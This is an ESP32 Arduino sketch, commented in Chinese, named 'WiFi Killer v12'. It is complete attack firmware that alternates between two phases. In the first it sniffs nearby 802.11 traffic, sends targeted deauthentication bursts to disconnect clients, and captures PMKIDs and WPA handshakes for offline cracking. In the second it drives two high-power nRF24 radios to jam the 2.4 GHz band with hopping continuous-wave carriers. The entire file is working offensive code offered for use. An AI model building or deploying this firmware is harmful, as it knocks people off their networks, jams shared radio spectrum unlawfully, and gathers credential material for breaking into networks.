/**
 * ESP32 Time-Division WiFi Killer v12
 * 
 * 核心策略：時分多工，ESP32 WiFi 與 nRF24 雙 CW 交替運作
 * 
 * Phase A (WiFi ON, 500ms):
 *   - Promiscuous sniff 所有 802.11 封包
 *   - 提取 client MAC + AP BSSID
 *   - Targeted deauth (鎖定目標 channel)
 *   - 捕獲 PMKID / 4-way handshake
 * 
 * Phase B (WiFi OFF, nRF24 CW ON, 500ms):
 *   - 關閉 ESP32 WiFi/BT
 *   - 雙 nRF24 PA+LNA 最高功率 10kHz 跳頻發 CW
 *   - 淹沒 beacon，阻擋重連，讓 AP 從列表消失
 * 
 * 硬體：ESP32 DevKit + 雙 nRF24 PA+LNA
 * 接線：
 *   VSPI: CE=26, CSN=25, SCK=18, MOSI=23, MISO=19
 *   HSPI: CE=15, CSN=21, SCK=14, MOSI=13, MISO=12
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <nvs_flash.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_timer.h>
#include <SPI.h>
#include "RF24.h"
#include <string.h>
#include <stdio.h>

// ========== 時分多工設定 ==========
#define PHASE_WIFI_MS    500   // WiFi 階段持續時間
#define PHASE_CW_MS      500   // CW 階段持續時間
#define CHANNEL_HOP_MS   150   // WiFi 階段 channel hop 間隔
#define DEAUTH_BURST     8     // 每輪每個 client 發 deauth 數
#define STAT_INTERVAL_MS 3000

// ========== nRF24 設定 ==========
#define VSPI_CE   26
#define VSPI_CSN  25
#define HSPI_CE   15
#define HSPI_CSN  21

SPIClass *vspi_bus = nullptr;
SPIClass *hspi_bus = nullptr;
RF24 radio_vspi(VSPI_CE, VSPI_CSN);
RF24 radio_hspi(HSPI_CE, HSPI_CSN);

const uint8_t CW_CHANNELS[] = {
  12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72,
  2, 26, 80,
  4, 9, 14, 19, 24, 29, 34, 39, 44, 49, 54, 59, 64, 69, 74, 79, 84, 89
};
const int CW_N = sizeof(CW_CHANNELS) / sizeof(CW_CHANNELS[0]);
volatile int cwIdx = 0;

void IRAM_ATTR hopISR() {
  uint8_t ch = CW_CHANNELS[cwIdx % CW_N];
  cwIdx++;
  radio_vspi.setChannel(ch);
  radio_hspi.setChannel(ch);
}

// ========== WiFi 攻擊結構 ==========
#define MAX_APS      64
#define MAX_CLIENTS  128

struct APInfo {
  uint8_t bssid[6];
  uint8_t channel;
  int8_t rssi;
  char ssid[33];
  uint32_t lastSeen;
  bool pmkidCaptured;
  bool handshakeCaptured;
  uint32_t deauthSent;
} aps[MAX_APS];
int apCount = 0;

struct ClientInfo {
  uint8_t mac[6];
  uint8_t apBssid[6];
  uint8_t channel;
  uint32_t lastSeen;
  uint32_t deauthSent;
  bool associated;
} clients[MAX_CLIENTS];
int clientCount = 0;

// Deauth template
uint8_t deauthTemplate[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00, 0x00, 0x07, 0x00
};

// ========== 狀態機 ==========
enum Phase { PHASE_WIFI, PHASE_CW };
volatile Phase currentPhase = PHASE_WIFI;
volatile bool phaseSwitchPending = false;

static unsigned long phaseStartTime = 0;
static unsigned long lastHop = 0;
static unsigned long lastStat = 0;
static uint32_t totalDeauths = 0;
static uint32_t totalFrames = 0;
static uint32_t pmkidCount = 0;
static uint32_t handshakeCount = 0;
static uint8_t wifiChannel = 1;

// ========== 工具函數 ==========
bool macEq(const uint8_t* a, const uint8_t* b) { return memcmp(a, b, 6) == 0; }
void macCpy(uint8_t* dst, const uint8_t* src) { memcpy(dst, src, 6); }
void printMac(const uint8_t* mac) { Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]); }

int findAP(const uint8_t* bssid) { for (int i=0;i<apCount;i++) if (macEq(aps[i].bssid, bssid)) return i; return -1; }
int findClient(const uint8_t* mac) { for (int i=0;i<clientCount;i++) if (macEq(clients[i].mac, mac)) return i; return -1; }

int addAP(const uint8_t* bssid, uint8_t channel, int8_t rssi, const char* ssid) {
  int idx = findAP(bssid);
  if (idx >= 0) { aps[idx].channel = channel; aps[idx].rssi = rssi; aps[idx].lastSeen = millis(); return idx; }
  if (apCount >= MAX_APS) return -1;
  idx = apCount++;
  macCpy(aps[idx].bssid, bssid);
  aps[idx].channel = channel; aps[idx].rssi = rssi; aps[idx].lastSeen = millis();
  aps[idx].pmkidCaptured = false; aps[idx].handshakeCaptured = false; aps[idx].deauthSent = 0;
  if (ssid) strncpy(aps[idx].ssid, ssid, 32); else aps[idx].ssid[0] = 0;
  return idx;
}

int addClient(const uint8_t* clientMac, const uint8_t* apBssid, uint8_t channel) {
  int idx = findClient(clientMac);
  if (idx >= 0) { clients[idx].lastSeen = millis(); macCpy(clients[idx].apBssid, apBssid); clients[idx].channel = channel; return idx; }
  if (clientCount >= MAX_CLIENTS) return -1;
  idx = clientCount++;
  macCpy(clients[idx].mac, clientMac); macCpy(clients[idx].apBssid, apBssid);
  clients[idx].channel = channel; clients[idx].lastSeen = millis(); clients[idx].deauthSent = 0; clients[idx].associated = true;
  return idx;
}

// ========== Phase Switch Timer ==========
void IRAM_ATTR phaseTimerCb(void* arg) {
  phaseSwitchPending = true;
}

// ========== WiFi Promiscuous Callback ==========
void snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (currentPhase != PHASE_WIFI) return; // 只在 WiFi 階段處理
  
  totalFrames++;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* data = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  uint8_t channel = pkt->rx_ctrl.channel;
  int8_t rssi = pkt->rx_ctrl.rssi;
  if (len < 24) return;
  
  uint16_t fc = data[0] | (data[1] << 8);
  uint8_t frameType = fc & 0x0C;
  uint8_t frameSubtype = fc & 0xF0;
  uint8_t ds = fc & 0x03;
  
  uint8_t* addr1 = data + 4;
  uint8_t* addr2 = data + 10;
  uint8_t* addr3 = data + 16;
  
  if (frameType == 0x00) { // Management
    if (frameSubtype == 0x80 || frameSubtype == 0x50) { // Beacon / Probe Resp
      uint8_t* tagPtr = data + 36;
      int tagLen = len - 36;
      char ssid[33] = {0};
      while (tagLen > 2) {
        uint8_t tagId = tagPtr[0], tagLength = tagPtr[1];
        if (tagId == 0 && tagLength <= 32) { memcpy(ssid, tagPtr+2, tagLength); ssid[tagLength]=0; break; }
        tagPtr += 2 + tagLength; tagLen -= 2 + tagLength;
      }
      addAP(addr3, channel, rssi, ssid);
    } else if (frameSubtype == 0xB0 || frameSubtype == 0x00 || frameSubtype == 0x20) { // Auth/Assoc
      int apIdx = addAP(addr1, channel, rssi, nullptr);
      if (apIdx >= 0) addClient(addr2, addr1, channel);
    }
  } else if (frameType == 0x08) { // Data
    const uint8_t *clientMac = nullptr;
    const uint8_t *apBssid = nullptr;
    if (ds == 0x01) { clientMac = addr2; apBssid = addr1; }
    else if (ds == 0x02) { clientMac = addr1; apBssid = addr2; }
    else if (ds == 0x00) { clientMac = addr2; apBssid = addr3; }
    else return;
    
    if (clientMac && apBssid && !(clientMac[0] & 0x01)) {
      int apIdx = addAP(apBssid, channel, rssi, nullptr);
      if (apIdx >= 0) addClient(clientMac, apBssid, channel);
    }
    
    // EAPOL detection
    if (len > 30 && data[24]==0xAA && data[25]==0xAA && data[26]==0x03 &&
        data[27]==0x00 && data[28]==0x00 && data[29]==0x00 &&
        data[30]==0x88 && data[31]==0x8E) {
      uint8_t* eapol = data + 32;
      int eapolLen = len - 32;
      if (eapolLen >= 4 && eapol[1] == 3 && eapolLen >= 96) {
        uint16_t keyInfo = eapol[5] << 8 | eapol[6];
        bool pairwise = keyInfo & 0x0008, install = keyInfo & 0x0040, ack = keyInfo & 0x0080, mic = keyInfo & 0x0100;
        int apIdx = findAP(apBssid);
        if (apIdx >= 0) {
          if (mic && pairwise && !aps[apIdx].handshakeCaptured) {
            aps[apIdx].handshakeCaptured = true; handshakeCount++;
            Serial.printf("[HANDSHAKE] AP: "); printMac(apBssid); Serial.printf(" Client: "); printMac(clientMac); Serial.println();
          } else if (!mic && !ack && !aps[apIdx].pmkidCaptured) {
            aps[apIdx].pmkidCaptured = true; pmkidCount++;
            Serial.printf("[PMKID] AP: "); printMac(apBssid); Serial.printf(" Client: "); printMac(clientMac); Serial.println();
          }
        }
      }
    }
  }
}

// ========== Phase Control ==========
void enterWiFiPhase() {
  currentPhase = PHASE_WIFI;
  
  // 啟用 ESP32 WiFi
  nvs_flash_init();
  esp_netif_init();
  esp_event_loop_create_default();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
  
  // 停止 nRF24 CW
  radio_vspi.stopConstCarrier();
  radio_hspi.stopConstCarrier();
  radio_vspi.powerDown();
  radio_hspi.powerDown();
  
  Serial.println("[PHASE] >>> WIFI ON (sniff + deauth) <<<");
}

void enterCWPhase() {
  currentPhase = PHASE_CW;
  
  // 關閉 ESP32 WiFi/BT - 先停止 promiscuous 再 deinit
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_bt_controller_deinit();
  delay(10); // 給硬體時間關閉
  
  // 初始化 nRF24 VSPI
  vspi_bus->begin(18, 19, 23, -1);
  if (!radio_vspi.begin(vspi_bus)) {
    Serial.println("[NRF] VSPI FAIL");
    return;
  }
  radio_vspi.setAutoAck(false);
  radio_vspi.stopListening();
  radio_vspi.setRetries(0,0);
  radio_vspi.setPALevel(RF24_PA_MAX, true);
  radio_vspi.setDataRate(RF24_2MBPS);
  radio_vspi.setCRCLength(RF24_CRC_DISABLED);
  radio_vspi.startConstCarrier(RF24_PA_MAX, CW_CHANNELS[0]);
  
  // 初始化 nRF24 HSPI
  hspi_bus->begin(14, 12, 13, -1);
  if (!radio_hspi.begin(hspi_bus)) {
    Serial.println("[NRF] HSPI FAIL");
    return;
  }
  radio_hspi.setAutoAck(false);
  radio_hspi.stopListening();
  radio_hspi.setRetries(0,0);
  radio_hspi.setPALevel(RF24_PA_MAX, true);
  radio_hspi.setDataRate(RF24_2MBPS);
  radio_hspi.setCRCLength(RF24_CRC_DISABLED);
  radio_hspi.startConstCarrier(RF24_PA_MAX, CW_CHANNELS[0]);
  
  // 啟動 10kHz hop ISR - 等待 radios ready
  delay(10);
  esp_timer_create_args_t ta = { .callback = [](void*){ hopISR(); }, .arg=nullptr, .dispatch_method=ESP_TIMER_TASK, .name="hop" };
  esp_timer_handle_t ht; 
  if (esp_timer_create(&ta, &ht) == ESP_OK) {
    esp_timer_start_periodic(ht, 100);
  }
  
  Serial.println("[PHASE] >>> CW JAMMING ON (nRF24 dual 200mW) <<<");
}

void switchPhase() {
  if (currentPhase == PHASE_WIFI) {
    enterCWPhase();
  } else {
    enterWiFiPhase();
  }
  phaseStartTime = millis();
  phaseSwitchPending = false;
}

// ========== Targeted Deauth ==========
void sendTargetedDeauth(const uint8_t* clientMac, const uint8_t* apBssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delayMicroseconds(1000);
  
  uint8_t frame[26];
  memcpy(frame, deauthTemplate, 26);
  memcpy(frame + 4, clientMac, 6);
  memcpy(frame + 10, apBssid, 6);
  memcpy(frame + 16, apBssid, 6);
  
  for (int i = 0; i < DEAUTH_BURST; i++) {
    frame[22] = (frame[22] + 0x10) & 0xF0;
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    delayMicroseconds(500);
  }
  totalDeauths += DEAUTH_BURST;
}

void deauthAllClients() {
  if (currentPhase != PHASE_WIFI) return;
  for (int i = 0; i < clientCount; i++) {
    if (!clients[i].associated) continue;
    if (millis() - clients[i].lastSeen > 30000) continue;
    int apIdx = findAP(clients[i].apBssid);
    if (apIdx >= 0) {
      sendTargetedDeauth(clients[i].mac, clients[i].apBssid, aps[apIdx].channel);
      clients[i].deauthSent += DEAUTH_BURST;
      aps[apIdx].deauthSent += DEAUTH_BURST;
    }
  }
}

void wifiChannelHop() {
  wifiChannel++; if (wifiChannel > 13) wifiChannel = 1;
  esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
  lastHop = millis();
}

// ========== Status ==========
void printStatus() {
  Serial.printf("\n=== v12 STATUS | Phase: %s ===\n", currentPhase==PHASE_WIFI?"WIFI":"CW");
  Serial.printf("Frames: %u | Deauths: %u | PMKIDs: %u | Handshakes: %u\n", totalFrames, totalDeauths, pmkidCount, handshakeCount);
  Serial.printf("APs: %d | Clients: %d | WiFi CH: %d\n", apCount, clientCount, wifiChannel);
  
  Serial.println("\n--- Top 8 APs ---");
  for (int i=0;i<apCount && i<8;i++) {
    Serial.printf("  [%d] CH%d RSSI=%d ", i, aps[i].channel, aps[i].rssi);
    printMac(aps[i].bssid);
    Serial.printf(" %s%s%s Deauths:%u\n", aps[i].ssid[0]?aps[i].ssid:"<hidden>",
      aps[i].pmkidCaptured?" [PMKID]":"", aps[i].handshakeCaptured?" [HANDSHAKE]":"", aps[i].deauthSent);
  }
  
  Serial.println("\n--- Top 8 Clients ---");
  int shown=0;
  for (int i=0;i<clientCount && shown<8;i++) {
    if (!clients[i].associated) continue;
    Serial.printf("  "); printMac(clients[i].mac);
    Serial.printf(" -> AP: "); printMac(clients[i].apBssid);
    Serial.printf(" CH%d Deauths:%u\n", clients[i].channel, clients[i].deauthSent);
    shown++;
  }
  Serial.println("===================\n");
}

// ========== Setup ==========
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== ESP32 Time-Division WiFi Killer v12 ===");
  Serial.println("Phase A: WiFi sniff + targeted deauth + handshake capture");
  Serial.println("Phase B: nRF24 dual CW jamming (200mW x2 @ 10kHz)");
  Serial.println("Cycle: 500ms WiFi / 500ms CW");
  
  // 初始化 nRF24 SPI bus（但不啟動 radio）
  vspi_bus = new SPIClass(VSPI);
  hspi_bus = new SPIClass(HSPI);
  
  // Phase timer: 每 500ms 切換
  esp_timer_create_args_t pta = { .callback = phaseTimerCb, .arg=nullptr, .dispatch_method=ESP_TIMER_TASK, .name="phase" };
  esp_timer_handle_t pht; esp_timer_create(&pta, &pht); esp_timer_start_periodic(pht, PHASE_WIFI_MS * 1000);
  
  // 開始第一階段
  enterWiFiPhase();
  phaseStartTime = millis();
  lastStat = millis();
  Serial.println("[READY] v12 time-division active");
}

// ========== Loop ==========
void loop() {
  // Phase switch check
  if (phaseSwitchPending) {
    switchPhase();
  }
  
  // Phase-specific work
  if (currentPhase == PHASE_WIFI) {
    // WiFi channel hop
    if (millis() - lastHop > CHANNEL_HOP_MS) wifiChannelHop();
    // Deauth clients
    deauthAllClients();
  } else {
    // CW phase: nRF24 ISR handles hopping, just prevent watchdog
    delay(10);
  }
  
  // Status print
  if (millis() - lastStat > STAT_INTERVAL_MS) {
    printStatus();
    lastStat = millis();
  }
  
  delay(1);
}